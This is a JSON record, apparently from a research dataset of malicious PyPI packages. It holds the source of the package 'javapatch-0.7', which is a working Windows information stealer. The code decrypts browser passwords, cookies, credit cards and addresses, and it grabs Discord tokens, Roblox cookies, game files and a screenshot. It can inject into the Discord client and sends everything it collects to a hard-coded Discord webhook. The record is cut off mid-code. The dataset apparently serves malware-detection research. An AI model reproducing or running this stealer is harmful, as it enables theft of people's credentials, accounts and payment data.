{
  "metadata": {
    "package_name": "javapatch-0",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/javapatch-0.7.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/javapatch-0.7/javapatch-0.7/src/javapatch/__init__.py",
      "code_snippets": [
        {
          "snippet": "import os,json,shutil,base64,sqlite3,zipfile,requests,subprocess,psutil,random,ctypes,sys,re,datetime,time,traceback\nimport ctypes.wintypes as wintypes\nfrom threading import Thread\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\nfrom Crypto.Cipher import AES\n\nconfig = {\n    'webhook': 'https://discord.com/api/webhooks/1154967436722962493/-styemuSIUtr6xXRP4Kl6wuOawIi1theLKqbRWTSZJ_od8oshGqFg8i0bAiaH7rGaapS',\n    'persist': False,\n    'keep-alive': False,\n    'injection_url': 'url to injection (raw)',\n    'inject': False,\n    'hideconsole': False,\n    'antivm': True,\n    'force_admin': False,\n    'black_screen': False,\n    'error': False,\n    'error_message': 'This application failed to start because MSCVDLL.dll is missing.\\n\\nPlease download the latest version of Microsoft C++ Compiler and try again.',\n}\n\nclass functions(object):\n    def getHeaders(self, token:str=None, content_type=\"application/json\") -> dict:\n        headers = {\"Content-Type\": content_type, \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\"}\n        if token: headers.update({\"Authorization\": token})\n        return headers\n    def get_master_key(self, path) -> str:\n        try:\n            with open(path, \"r\", encoding=\"utf-8\") as f: local_state = f.read()\n            local_state = json.loads(local_state)\n            master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n            master_key = master_key[5:]\n            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n            return master_key\n        except Exception:\n            return None\n    def decrypt_val(self, buff, master_key) -> str:\n        try:\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = AES.new(master_key, AES.MODE_GCM, iv)\n            decrypted_pass = cipher.decrypt(payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n        except Exception: return f'Failed to decrypt \"{str(buff)}\" | Key: \"{str(master_key)}\"'\n    def whichProcessesUsingFile(self, path: str) -> list:\n            ntdll = ctypes.WinDLL('ntdll')\n            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)\n            NTSTATUS = wintypes.LONG\n            INVALID_HANDLE_VALUE = wintypes.HANDLE(-1).value\n            FILE_READ_ATTRIBUTES = 0x80\n            FILE_SHARE_READ = 1\n            OPEN_EXISTING = 3\n            FILE_FLAG_BACKUP_SEMANTICS = 0x02000000\n            FILE_INFORMATION_CLASS = wintypes.ULONG\n            FileProcessIdsUsingFileInformation = 47\n            LPSECURITY_ATTRIBUTES = wintypes.LPVOID\n            ULONG_PTR = wintypes.WPARAM\n            kernel32.CreateFileW.restype = wintypes.HANDLE\n            kernel32.CreateFileW.argtypes = (\n                wintypes.LPCWSTR,      # In     lpFileName\n                wintypes.DWORD,        # In     dwDesiredAccess\n                wintypes.DWORD,        # In     dwShareMode\n                LPSECURITY_ATTRIBUTES,  # In_opt lpSecurityAttributes\n                wintypes.DWORD,        # In     dwCreationDisposition\n                wintypes.DWORD,        # In     dwFlagsAndAttributes\n                wintypes.HANDLE)       # In_opt hTemplateFile\n            hFile = kernel32.CreateFileW(\n                path, FILE_READ_ATTRIBUTES, FILE_SHARE_READ, None, OPEN_EXISTING,\n                FILE_FLAG_BACKUP_SEMANTICS, None)\n            if hFile == INVALID_HANDLE_VALUE:\n                raise ctypes.WinError(ctypes.get_last_error())\n            class IO_STATUS_BLOCK(ctypes.Structure):\n                class _STATUS(ctypes.Union):\n                    _fields_ = (('Status', NTSTATUS),\n                                ('Pointer', wintypes.LPVOID))\n                _anonymous_ = '_Status',\n                _fields_ = (('_Status', _STATUS),\n                            ('Information', ULONG_PTR))\n            iosb = IO_STATUS_BLOCK()\n            class FILE_PROCESS_IDS_USING_FILE_INFORMATION(ctypes.Structure):\n                _fields_ = (('NumberOfProcessIdsInList', wintypes.LARGE_INTEGER),\n                            ('ProcessIdList', wintypes.LARGE_INTEGER * 64))\n            info = FILE_PROCESS_IDS_USING_FILE_INFORMATION()\n            PIO_STATUS_BLOCK = ctypes.POINTER(IO_STATUS_BLOCK)\n            ntdll.NtQueryInformationFile.restype = NTSTATUS\n            ntdll.NtQueryInformationFile.argtypes = (\n                wintypes.HANDLE,        # In  FileHandle\n                PIO_STATUS_BLOCK,       # Out IoStatusBlock\n                wintypes.LPVOID,        # Out FileInformation\n                wintypes.ULONG,         # In  Length\n                FILE_INFORMATION_CLASS)  # In  FileInformationClass\n            status = ntdll.NtQueryInformationFile(hFile, ctypes.byref(iosb),\n                                                ctypes.byref(info),\n                                                ctypes.sizeof(info),\n                                                FileProcessIdsUsingFileInformation)\n            pidList = info.ProcessIdList[0:info.NumberOfProcessIdsInList]\n            return pidList\n    def system(self, action):\n        return '\\n'.join(line for line in subprocess.check_output(action, creationflags=0x08000000, shell=True).decode().strip().splitlines() if line.strip())\n\nclass internal:\n    tempfolder = None\n    stolen = False\n\nclass ticks(functions, internal):\n    def __init__(self,useless):\n        del useless\n        if config.get('error'): Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, config.get('error_message'), os.path.basename(sys.argv[0]), 0x1 | 0x10)).start()\n        try: admin = ctypes.windll.shell32.IsUserAnAdmin()\n        except Exception: admin = False\n        if not admin and config['force_admin'] and '--nouacbypass' not in sys.argv: self.forceadmin()\n        self.webhook = config.get('webhook')\n        self.exceptions = []\n        self.baseurl = \"https://discord.com/api/v9/users/@me\"\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        dirs = [\n            self.appdata,\n            self.roaming,\n            os.getenv('temp'),\n            'C:\\\\Users\\\\Public\\\\Public Music',\n            'C:\\\\Users\\\\Public\\\\Public Pictures',\n            'C:\\\\Users\\\\Public\\\\Public Videos',\n            'C:\\\\Users\\\\Public\\\\Public Documents',\n            'C:\\\\Users\\\\Public\\\\Public Downloads',\n            os.getenv('userprofile'),\n            os.getenv('userprofile') + '\\\\Documents',\n            os.getenv('userprofile') + '\\\\Music',\n            os.getenv('userprofile') + '\\\\Pictures',\n            os.getenv('userprofile') + '\\\\Videos'\n        ]\n        while True:\n            rootpath = random.choice(dirs)\n            if os.path.exists(rootpath):\n                self.tempfolder = os.path.join(rootpath,''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890',k=8)))\n                break\n        internal.tempfolder = self.tempfolder\n        self.browserpaths = {\n            'Opera': self.roaming + r'\\\\Opera Software\\\\Opera Stable',\n            'Opera GX': self.roaming + r'\\\\Opera Software\\\\Opera GX Stable',\n            'Edge': self.appdata + r'\\\\Microsoft\\\\Edge\\\\User Data',\n            'Chrome': self.appdata + r'\\\\Google\\\\Chrome\\\\User Data',\n            'Yandex': self.appdata + r'\\\\Yandex\\\\YandexBrowser\\\\User Data',\n            'Brave': self.appdata + r'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data',\n            'Amigo': self.appdata + r'\\\\Amigo\\\\User Data',\n            'Torch': self.appdata + r'\\\\Torch\\\\User Data',\n            'Kometa': self.appdata + r'\\\\Kometa\\\\User Data',\n            'Orbitum': self.appdata + r'\\\\Orbitum\\\\User Data',\n            'CentBrowser': self.appdata + r'\\\\CentBrowser\\\\User Data',\n            '7Star': self.appdata + r'\\\\7Star\\\\7Star\\\\User Data',\n            'Sputnik': self.appdata + r'\\\\Sputnik\\\\Sputnik\\\\User Data',\n            'Chrome SxS': self.appdata + r'\\\\Google\\\\Chrome SxS\\\\User Data',\n            'Epic Privacy Browser': self.appdata + r'\\\\Epic Privacy Browser\\\\User Data',\n            'Vivaldi': self.appdata + r'\\\\Vivaldi\\\\User Data',\n            'Chrome Beta': self.appdata + r'\\\\Google\\\\Chrome Beta\\\\User Data',\n            'Uran': self.appdata + r'\\\\uCozMedia\\\\Uran\\\\User Data',\n            'Iridium': self.appdata + r'\\\\Iridium\\\\User Data',\n            'Chromium': self.appdata + r'\\\\Chromium\\\\User Data'\n        }\n        self.stats = {\n            'passwords': 0,\n            'tokens': 0,\n            'phones': 0,\n            'addresses': 0,\n            'cards': 0,\n            'cookies': 0\n        }\n        try:\n            os.makedirs(os.path.join(self.tempfolder), 0x1ED, exist_ok=True)\n            ctypes.windll.kernel32.SetFileAttributesW(self.tempfolder,0x2)\n            ctypes.windll.kernel32.SetFileAttributesW(self.tempfolder,0x4)\n            ctypes.windll.kernel32.SetFileAttributesW(self.tempfolder,0x256)\n        except Exception: self.exceptions.append(traceback.format_exc())\n        os.chdir(self.tempfolder)\n        if config.get('persist') and not self.stolen: Thread(target=self.persist).start()\n        if config.get('inject'): Thread(target=self.injector).start()\n        self.tokens = []\n        self.robloxcookies = []\n        self.files = \"\"\n        threads = [Thread(target=self.screenshot),Thread(target=self.grabMinecraftCache),Thread(target=self.grabGDSave),Thread(target=self.tokenRun),Thread(target=self.grabRobloxCookie),Thread(target=self.getSysInfo)]\n        for plt, pth in self.browserpaths.items(): threads.append(Thread(target=self.grabBrowserInfo,args=(plt,pth)))\n        for thread in threads: thread.start()\n        for thread in threads: thread.join()\n        if self.exceptions:\n            with open(self.tempfolder+'\\\\Exceptions.txt','w',encoding='utf-8') as f:\n                f.write('\\n'.join(self.exceptions))\n        self.SendInfo()\n        shutil.rmtree(self.tempfolder)\n        if config.get('black_screen'): self.system('start ms-cxh-full://0')\n    def tokenRun(self):\n        self.grabTokens()\n        self.neatifyTokens()\n    def checkToken(self, tkn, source):\n        try:\n            r = requests.get(self.baseurl, headers=self.getHeaders(tkn))\n            if r.status_code == 200 and tkn not in [token[0] for token in self.tokens]:\n                self.tokens.append((tkn, source))\n                self.stats['tokens'] += 1\n        except Exception: self.exceptions.append(traceback.format_exc())\n    def bypassBetterDiscord(self):\n        bd = self.roaming+\"\\\\BetterDiscord\\\\data\\\\betterdiscord.asar\"\n        if os.path.exists(bd):\n            with open(bd, 'r', encoding=\"utf8\", errors='ignore') as f:\n                txt = f.read()\n                content = txt.replace('api/webhooks', 'api/nethooks')\n            with open(bd, 'w', newline='', encoding=\"utf8\", errors='ignore') as f: f.write(content)\n    def grabBrowserInfo(self, platform, path):\n        if os.path.exists(path):\n            self.passwords_temp = self.cookies_temp = self.history_temp = self.misc_temp = self.formatted_cookies = ''\n            sep = '='*40\n            fname = lambda x: f'\\\\{platform} Info ({x}).txt'\n            formatter = lambda p, c, h, m: f'Browser: {platform}\\n\\n{sep}\\n               PASSWORDS\\n{sep}\\n\\n{p}\\n{sep}\\n                COOKIES\\n{sep}\\n\\n{c}\\n{sep}\\n                HISTORY\\n{sep}\\n\\n{h}\\n{sep}\\n               OTHER INFO\\n{sep}\\n\\n{m}'\n            profiles = ['Default']\n            for dir in os.listdir(path):\n                if dir.startswith('Profile ') and os.path.isdir(dir): profiles.append(dir)\n            if platform in [\n                'Opera',\n                'Opera GX',\n                'Amigo',\n                'Torch',\n                'Kometa',\n                'Orbitum',\n                'CentBrowser',\n                '7Star',\n                'Sputnik',\n                'Chrome SxS',\n                'Epic Privacy Browser',\n            ]:\n                cpath = path + '\\\\Network\\\\Cookies'\n                ppath = path + '\\\\Login Data'\n                hpath = path + '\\\\History'\n                wpath = path + '\\\\Web Data'\n                mkpath = path + '\\\\Local State'\n                fname = f'\\\\{platform} Info (Default).txt'\n                threads = [\n                    Thread(target=self.grabPasswords,args=[mkpath,platform,'Default',ppath]),\n                    Thread(target=self.grabCookies,args=[mkpath,platform,'Default',cpath]),\n                    Thread(target=self.grabHistory,args=[mkpath,platform,'Default',hpath]),\n                    Thread(target=self.grabMisc,args=[mkpath,platform,'Default',wpath])\n                ]\n                for x in threads:\n                    x.start()\n                for x in threads:\n                    x.join()\n                try: self.grabPasswords(mkpath,fname,ppath); self.grabCookies(mkpath,fname,cpath); self.grabHistory(mkpath,fname,hpath); self.grabMisc(mkpath,fname,wpath)\n                except Exception: self.exceptions.append(traceback.format_exc())\n            else:\n                for profile in profiles:\n                    cpath = path + f'\\\\{profile}\\\\Network\\\\Cookies'\n                    ppath = path + f'\\\\{profile}\\\\Login Data'\n                    hpath = path + f'\\\\{profile}\\\\History'\n                    wpath = path + f'\\\\{profile}\\\\Web Data'\n                    mkpath = path + '\\\\Local State'\n                    fname = f'\\\\{platform} Info ({profile}).txt'\n                    threads = [\n                        Thread(target=self.grabPasswords,args=[mkpath,platform,profile,ppath]),\n                        Thread(target=self.grabCookies,args=[mkpath,platform,profile,cpath]),\n                        Thread(target=self.grabHistory,args=[mkpath,platform,profile,hpath]),\n                        Thread(target=self.grabMisc,args=[mkpath,platform,profile,wpath])\n                    ]\n                    for x in threads:\n                        x.start()\n                    for x in threads:\n                        x.join()\n            with open(self.tempfolder+f'\\\\{platform} Cookies ({profile}).txt', \"w\", encoding=\"utf8\", errors='ignore') as m, open(self.tempfolder+fname, \"w\", encoding=\"utf8\", errors='ignore') as f:\n                if self.formatted_cookies:\n                    m.write(self.formatted_cookies)\n                else:\n                    m.close()\n                    os.remove(self.tempfolder+f'\\\\{platform} Cookies ({profile}).txt')\n                if self.passwords_temp or self.cookies_temp or self.history_temp or self.misc_temp:\n                    f.write(formatter(self.passwords_temp, self.cookies_temp, self.history_temp, self.misc_temp))\n                else:\n                    f.close()\n                    os.remove(self.tempfolder+fname)\n            self.passwords_temp = self.cookies_temp = self.history_temp = self.misc_temp = self.formatted_cookies = ''\n    def injector(self):\n        self.bypassBetterDiscord()\n        for dir in os.listdir(self.appdata):\n            if 'discord' in dir.lower():\n                discord = self.appdata+f'\\\\{dir}'\n                disc_sep = discord+'\\\\'\n                for _dir in os.listdir(os.path.abspath(discord)):\n                    if re.match(r'app-(\\d*\\.\\d*)*', _dir):\n                        app = os.path.abspath(disc_sep+_dir)\n                        for x in os.listdir(os.path.join(app,'modules')):\n                            if x.startswith('discord_desktop_core-'):\n                                inj_path = app+f'\\\\modules\\\\{x}\\\\discord_desktop_core\\\\'\n                                if os.path.exists(inj_path):\n                                    f = requests.get(config.get('injection_url')).text.replace(\"%WEBHOOK%\", self.webhook)\n                                    with open(inj_path+'index.js', 'w', errors=\"ignore\") as indexFile: indexFile.write(f)\n    def grabPasswords(self,mkp,bname,pname,data):\n        self.passwords_temp = ''\n        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_PASSWORDS.db'.replace(' ','_'))\n        master_key = self.get_master_key(mkp)\n        login_db = data\n        try: shutil.copy2(login_db, newdb)\n        except PermissionError:\n            try:\n                for pid in self.whichProcessesUsingFile(login_db):\n                    self.system(f\"taskkill /f /pid {pid}\")\n                shutil.copy2(login_db, newdb)\n            except Exception:\n                pass\n        except Exception: self.exceptions.append(traceback.format_exc())\n        conn = sqlite3.connect(newdb)\n        cursor = conn.cursor()\n        try:\n            cursor.execute(\"SELECT action_url, username_value, password_value FROM logins\")\n            for r in cursor.fetchall():\n                url = r[0]\n                username = r[1]\n                encrypted_password = r[2]\n                decrypted_password = self.decrypt_val(encrypted_password, master_key)\n                if url != \"\":\n                    self.passwords_temp += f\"\\nDomain: {url}\\nUser: {username}\\nPass: {decrypted_password}\\n\"\n                    self.stats['passwords'] += 1\n        except Exception: self.exceptions.append(traceback.format_exc())\n        cursor.close()\n        conn.close()\n        try: os.remove(newdb)\n        except Exception: self.exceptions.append(traceback.format_exc())\n    def grabCookies(self,mkp,bname,pname,data):\n        self.cookies_temp = ''\n        self.formatted_cookies = ''\n        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_COOKIES.db'.replace(' ','_'))\n        master_key = self.get_master_key(mkp)\n        login_db = data\n        try: shutil.copy2(login_db, newdb)\n        except PermissionError:\n            try:\n                for pid in self.whichProcessesUsingFile(login_db):\n                    self.system(f\"taskkill /f /pid {pid}\")\n                shutil.copy2(login_db, newdb)\n            except Exception:\n                pass\n        except Exception: self.exceptions.append(traceback.format_exc())\n        conn = sqlite3.connect(newdb)\n        cursor = conn.cursor()\n        try:\n            cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")\n            for r in cursor.fetchall():\n                host = r[0]\n                user = r[1]\n                decrypted_cookie = self.decrypt_val(r[2], master_key)\n                if host != \"\":\n                    self.cookies_temp += f\"\\nHost: {host}\\nUser: {user}\\nCookie: {decrypted_cookie}\\n\"\n                    self.formatted_cookies += f\"{host}\\tTRUE\\t/\\tFALSE\\t1708726694\\t{user}\\t{decrypted_cookie}\\n\"\n                    self.stats['cookies'] += 1\n                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie: self.robloxcookies.append(decrypted_cookie)\n        except Exception: self.exceptions.append(traceback.format_exc())\n        cursor.close()\n        conn.close()\n        try: os.remove(newdb)\n        except Exception: self.exceptions.append(traceback.format_exc())\n    def grabHistory(self,mkp,bname,pname,data):\n        self.history_temp = ''\n        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_HISTORY.db'.replace(' ','_'))\n        login_db = data\n        try: shutil.copy2(login_db, newdb)\n        except PermissionError:\n            try:\n                for pid in self.whichProcessesUsingFile(login_db):\n                    self.system(f\"taskkill /f /pid {pid}\")\n                shutil.copy2(login_db, newdb)\n            except Exception:\n                pass\n        except Exception: self.exceptions.append(traceback.format_exc())\n        conn = sqlite3.connect(newdb)\n        cursor = conn.cursor()\n        try:\n            cursor.execute(\"SELECT title, url, visit_count, last_visit_time FROM urls\")\n            for r in cursor.fetchall()[::-1]:\n                title = r[0]\n                url = r[1]\n                count = r[2]\n                time = r[3]\n                time_neat = str(datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=time))[:-7].replace('-','/')\n                if url != \"\":\n                    self.history_temp += f\"\\nURL: {title}\\nTitle: {url}\\nVisit Count: {count}\\nLast Visited: {time_neat}\\n\"\n        except Exception: self.exceptions.append(traceback.format_exc())\n        cursor.close()\n        conn.close()\n        try: os.remove(newdb)\n        except Exception: self.exceptions.append(traceback.format_exc())\n    def grabMisc(self,mkp,bname,pname,data):\n        self.misc_temp = ''\n        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_WEBDATA.db'.replace(' ','_'))\n        master_key = self.get_master_key(mkp)\n        login_db = data\n        try: shutil.copy2(login_db, newdb)\n        except PermissionError:\n            try:\n                for pid in self.whichProcessesUsingFile(login_db):\n                    self.system(f\"taskkill /f /pid {pid}\")\n                shutil.copy2(login_db, newdb)\n            except Exception:\n                pass\n        except Exception: self.exceptions.append(traceback.format_exc())\n        conn = sqlite3.connect(newdb)\n        cursor = conn.cursor()\n        try:\n            cursor.execute(\"SELECT street_address, city, state, zipcode FROM autofill_profiles\")\n            for r in cursor.fetchall():\n                Address = r[0]\n                City = r[1]\n                State = r[2]\n                ZIP = r[3]\n                if Address != \"\":\n                    self.misc_temp += f\"\\nAddress: {Address}\\nCity: {City}\\nState: {State}\\nZIP Code: {ZIP}\\n\"\n                    self.stats['addresses'] += 1\n            cursor.execute(\"SELECT number FROM autofill_profile_phones\")\n            for r in cursor.fetchall():\n                Number = r[0]\n                if Number != \"\":\n                    self.misc_temp += f\"\\nPhone Number: {Number}\\n\"\n                    self.stats['phones'] += 1\n            cursor.execute(\"SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards\")\n            for r in cursor.fetchall():\n                Name = r[0]\n                ExpM = r[1]\n                ExpY = r[2]\n                decrypted_card = self.decrypt_val(r[3], master_key)\n                if decrypted_card != \"\":\n                    self.misc_temp += f\"\\nCard Number: {decrypted_card}\\nName on Card: {Name}\\nExpiration Month: {ExpM}\\nExpiration Year: {ExpY}\\n\"\n                    self.stats['cards'] += 1\n        except Exception: self.exceptions.append(traceback.format_exc())\n        cursor.close()\n        conn.close()\n        try: os.remove(newdb)\n        except Exception: self.exceptions.append(traceback.format_exc())\n    def grabRobloxCookie(self):\n        try: self.robloxcookies.append(self.system(r\"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com' -Name .ROBLOSECURITY\"))\n        except Exception: pass\n        if self.robloxcookies:\n            with open(self.tempfolder+\"\\\\Roblox Cookies.txt\", \"w\") as f:\n                for i in self.robloxcookies: f.write(i+'\\n')\n    def grabTokens(self):\n        paths = {\n            'Discord': self.roaming + r'\\\\discord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord Canary': self.roaming + r'\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\',\n            'Lightcord': self.roaming + r'\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord PTB': self.roaming + r'\\\\discordptb\\\\Local Storage\\\\leveldb\\\\',\n            'Opera': self.roaming + r'\\\\Opera Software\\\\Opera Stable',\n            'Opera GX': self.roaming + r'\\\\Opera Software\\\\Opera GX Stable',\n            'Amigo': self.appdata + r'\\\\Amigo\\\\User Data',\n            'Torch': self.appdata + r'\\\\Torch\\\\User Data',\n            'Kometa': self.appdata + r'\\\\Kometa\\\\User Data',\n            'Orbitum': self.appdata + r'\\\\Orbitum\\\\User Data',\n            'CentBrowser': self.appdata + r'\\\\CentBrowser\\\\User Data',\n            '7Star': self.appdata + r'\\\\7Star\\\\7Star\\\\User Data',\n            'Sputnik': self.appdata + r'\\\\Sputnik\\\\Sputnik\\\\User Data',\n            'Chrome SxS': self.appdata + r'\\\\Google\\\\Chrome SxS\\\\User Data',\n            'Epic Privacy Browser': self.appdata + r'\\\\Epic Privacy Browser\\\\User Data',\n            'Vivaldi': self.appdata + r'\\\\Vivaldi\\\\User Data\\\\<PROFILE>',\n            'Chrome': self.appdata + r'\\\\Google\\\\Chrome\\\\User Data\\\\<PROFILE>',\n            'Chrome Beta': self.appdata + r'\\\\Google\\\\Chrome Beta\\\\User Data\\\\<PROFILE>',\n            'Edge': self.appdata + r'\\\\Microsoft\\\\Edge\\\\User Data\\\\<PROFILE>',\n            'Uran': self.appdata + r'\\\\uCozMedia\\\\Uran\\\\User Data\\\\<PROFILE>',\n            'Yandex': self.appdata + r'\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\<PROFILE>',\n            'Brave': self.appdata + r'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\<PROFILE>',\n            'Iridium': self.appdata + r'\\\\Iridium\\\\User Data\\\\<PROFILE>',\n            'Chromium': self.appdata + r'\\\\Chromium\\\\User Data\\\\<PROFILE>'\n        }\n        for source, path in paths.items():\n            if not os.path.exists(path.replace('<PROFILE>','')): continue\n            if \"discord\" not in path:\n                profiles = ['Default']\n                for dir in os.listdir(path.replace('<PROFILE>','')):\n                    if dir.startswith('Profile '):\n                        profiles.append(dir)\n                for profile in profiles:\n                    newpath = path.replace('<PROFILE>',profile) + r'\\\\Local Storage\\\\leveldb\\\\'\n                    for file_name in os.listdir(newpath):\n                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue\n                        for line in [x.strip() for x in open(f'{newpath}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                            for token in re.findall(r\"[\\w-]{24,28}\\.[\\w-]{6}\\.[\\w-]{25,110}\", line): self.checkToken(token, f'{source} ({profile})')\n            else:\n                if os.path.exists(self.roaming+'\\\\discord\\\\Local State'):\n                    for file_name in os.listdir(path):\n                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue\n                        for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                            for y in re.findall(r\"dQw4w9WgXcQ:[^\\\"]*\", line): token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\\\discord\\\\Local State')); self.checkToken(token, source)\n        if os.path.exists(self.roaming+\"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n            for path, _, files in os.walk(self.roaming+\"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n                for _file in files:\n                    if not _file.endswith('.sqlite'): continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{_file}', errors='ignore').readlines() if x.strip()]:\n                            for token in re.findall(r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}\", line): self.checkToken(token, 'Firefox')\n    def neatifyTokens(self):\n        f = open(self.tempfolder+\"\\\\Discord Info.txt\", \"w+\", encoding=\"utf8\", errors='ignore')\n        for info in self.tokens:\n            token = info[0]\n            j = requests.get(self.baseurl, headers=self.getHeaders(token)).json()\n            user = j.get('username') + '#' + str(j.get(\"discriminator\"))\n            badges = \"\"\n            flags = j['flags']\n            if (flags == 1): badges += \"Staff, \"\n            if (flags == 2): badges += \"Partner, \"\n            if (flags == 4): badges += \"Hypesquad Event, \"\n            if (flags == 8): badges += \"Green Bughunter, \"\n            if (flags == 64): badges += \"Hypesquad Bravery, \"\n            if (flags == 128): badges += \"HypeSquad Brillance, \"\n            if (flags == 256): badges += \"HypeSquad Balance, \"\n            if (flags == 512): badges += \"Early Supporter, \"\n            if (flags == 16384): badges += \"Gold BugHunter, \"\n            if (flags == 131072): badges += \"Verified Bot Developer, \"\n            if (badges == \"\"): badges = \"None\"\n            email = j.get(\"email\")\n            phone = j.get(\"phone\") if j.get(\"phone\") else \"No Phone Number attached\"\n            try: nitro_data = requests.get(self.baseurl+'/billing/subscriptions', headers=self.getHeaders(token)).json()\n            except Exception: self.exceptions.append(traceback.format_exc())\n            has_nitro = False\n            has_nitro = bool(len(nitro_data) > 0)\n            try: billing = bool(len(json.loads(requests.get(self.baseurl+\"/billing/payment-sources\", headers=self.getHeaders(token)).text)) > 0)\n            except Exception: self.exceptions.append(traceback.format_exc())\n            f.write(f\"{' '*17}{user}\\n{'-'*50}\\nToken: {token}\\nPlatform: {info[1]}\\nHas Billing: {billing}\\nNitro: {has_nitro}\\nBadges: {badges}\\nEmail: {email}\\nPhone: {phone}\\n\\n\")\n        f.seek(0)\n        content = f.read()\n        f.close()\n        if not content:\n            os.remove(self.tempfolder+\"\\\\Discord Info.txt\")\n    def screenshot(self):\n        image = ImageGrab.grab(\n            bbox=None, \n            include_layered_windows=False, \n            all_screens=True, \n            xdisplay=None\n        )\n        image.save(self.tempfolder + \"\\\\Screenshot.png\")\n        image.close()\n    def grabMinecraftCache(self):\n        if not os.path.exists(os.path.join(self.roaming, '.minecraft')): return\n        minecraft = os.path.join(self.tempfolder, 'Minecraft Cache')\n        os.makedirs(minecraft, exist_ok=True)\n        mc = os.path.join(self.roaming, '.minecraft')\n        to_grab = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']\n        for _file in to_grab:\n            if os.path.exists(os.path.join(mc, _file)):\n                shutil.copy2(os.path.join(mc, _file), minecraft + os.sep + _file)\n    def grabGDSave(self):\n        if not os.path.exists(os.path.join(self.appdata, 'GeometryDash')): return\n        gd = os.path.join(self.tempfolder, 'Geometry Dash Save')\n        os.makedirs(gd, exist_ok=True)\n        gdf = os.path.join(self.appdata, 'GeometryDash')\n        to_grab = ['CCGameManager.dat']\n        for _file in to_grab:\n            if os.path.exists(os.path.join(gdf, _file)):\n                shutil.copy2(os.path.join(gdf, _file), gd + os.sep + _file)\n    def SendInfo(self):\n        wname = self.getProductValues()[0]\n        wkey = self.getProductValues()[1]\n        ip = country = city = region = googlemap = \"None\"\n        try:\n            data = requests.get(\"https://ipinfo.io/json\").json()\n            ip = data['ip']\n            city = data['city']\n            country = data['country']\n            region = data['region']\n            googlemap = \"https://www.google.com/maps/search/google+map++\" + data['loc']\n        except Exception: self.exceptions.append(traceback.format_exc())\n        _zipfile = os.path.join(self.tempfolder, f'Fentanyl-{os.getlogin()}.zip')\n        zipped_file = zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)\n        abs_src = os.path.abspath(self.tempfolder)\n        for dirname, _, files in os.walk(self.tempfolder):\n            for filename in files:\n                if filename == f'Fentanyl-{os.getlogin()}.zip': continue\n                absname = os.path.abspath(os.path.join(dirname, filename))\n                arcname = absname[len(abs_src) + 1:]\n                zipped_file.write(absname, arcname)\n        zipped_file.close()\n        self.files, self.fileCount = self.gen_tree(self.tempfolder)\n        self.fileCount =  f\"{self.fileCount} File{'s' if self.fileCount != 1 else ''} Found: \"\n        embed = {\n            \"username\": f\"{os.getlogin()} | Fentanyl\",\n            \"content\": \"@everyone\",\n            \"avatar_url\":\"https://cdn.discordapp.com/attachments/976805447266877471/987826721250238464/c33cd7baf5e2abdf434c2793988ccb56.png\",\n            \"embeds\": [\n                {\n                    \"author\": {\n                        \"name\": \"Fentanyl strikes again!\",\n                        \"url\": \"https://youareanidiot.cc\",\n                        \"icon_url\": \"https://cdn.discordapp.com/attachments/976805447266877471/987826721250238464/c33cd7baf5e2abdf434c2793988ccb56.png\"\n                    },\n                    \"description\": f'**{os.getlogin()}** ran Fentanyl.\\n\\n**Computer Name:** {os.getenv(\"COMPUTERNAME\")}\\n**{wname}:** {wkey if wkey else \"No Product Key!\"}\\n**IP:** {ip} (VPN/Proxy: {requests.get(\"http://ip-api.com/json?fields=proxy\").json()[\"proxy\"]})\\n**City:** {city}\\n**Region:** {region}\\n**Country:** {country}\\n[Google Maps Location]({googlemap})\\n```ansi\\n\\u001b[32m{self.fileCount}\\u001b[35m{self.files}``````ansi\\n\\u001b[32mStats:\\n\\u001b[35mPasswords Found: {self.stats[\"passwords\"]}\\nCookies Found: {self.stats[\"cookies\"]}\\nPhone Numbers Found: {self.stats[\"phones\"]}\\nCards Found: {self.stats[\"cards\"]}\\nAddresses Found: {self.stats[\"addresses\"]}\\nTokens Found: 